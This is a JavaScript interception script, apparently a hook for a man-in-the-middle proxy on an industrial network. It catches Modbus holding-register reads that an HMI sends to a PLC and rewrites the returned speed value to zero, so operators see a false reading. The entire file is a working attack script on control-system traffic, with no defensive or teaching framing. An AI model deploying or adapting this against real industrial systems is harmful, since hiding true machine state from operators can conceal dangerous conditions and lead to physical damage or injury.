function pad(n, width, z) {
  z = z || '0';
  n = n + '';
  return n.length >= width ? n : new Array(width - n.length + 1).join(z) + n;
}

var transactionIdToSpoof = -1;

function onData(from, to, data) {
  if (data.length >= 12) {
    var functionCode = data[7];
    var time = new Date().toTimeString().split(' ')[0];
    var isFromHMI = from.indexOf(".11") !== -1;

    // We are only interested in Function Code 3: Read Holding Registers
    if (functionCode == 3) {
      
      if (isFromHMI) {
        // Reconstruct the 16-bit address the HMI is asking for.
        var startAddr = (data[8] << 8) | data[9];
        
        // Check if the HMI is specifically asking for our target register (address 3).
        if (startAddr === 3) {
          // If it is, we grab the Transaction ID from the first two bytes of the packet.
          transactionIdToSpoof = (data[0] << 8) | data[1];
          
          log("┌─[" + time + "]─[READ REQUEST INTERCEPTED]────");
          log("│ HMI is asking for register 3 (speed).");
          log("│ Marking Transaction ID " + transactionIdToSpoof + " to be falsified on response.");
          log("└──────────────────────────────────────────");
        }
      }
      
      else { 
        // Get the Transaction ID from the PLC's response.
        var responseId = (data[0] << 8) | data[1];
        
        // If the response ID matches the one we saved, we have our target.
        if (responseId === transactionIdToSpoof && transactionIdToSpoof !== -1) {
          var originalValue = (data[9] << 8) | data[10]; // Get the real value for logging.
          
          log("╔═══[" + time + "]═══[READ RESPONSE FALSIFIED]═══╗");
          log("║ Intercepted PLC response for Transaction ID " + responseId + ".");
          log("║ Original Speed Value: " + originalValue);
          log("╠═══════════════════════════════════════════════════╣");
          log("║ [+] ACTION: Modifying value to 0 before sending to HMI. ║");
          log("╚═══════════════════════════════════════════════════╝");
          
          data[9] = 0x00;  // High byte of 0
          data[10] = 0x00; // Low byte of 0

          transactionIdToSpoof = -1; 
          
          return data;
        }
      }
    }
  }
  return data;
}

// Startup banner
log("");
log("╔═══════════════════════════════════════════════════╗");
log("║         RPM READ SCRIPT ACTIVE                    ║");
log("╠═══════════════════════════════════════════════════╣");
log("║ Configuration:                                    ║");
log("║ • Intercepting Modbus read requests (FC3).        ║");
log("║ • If HMI reads holding register 3 (speed),        ║");
log("║   the response value will be falsified to 0.      ║");
log("║ • All other traffic is ALLOWED to pass.           ║");
log("╠═══════════════════════════════════════════════════╣");
log("║ Target: 192.168.1.120 (PLC)                       ║");
log("║ Source: 192.168.1.11 (HMI)                        ║");
log("╚═══════════════════════════════════════════════════╝");
log("");
log("Monitoring Modbus traffic...");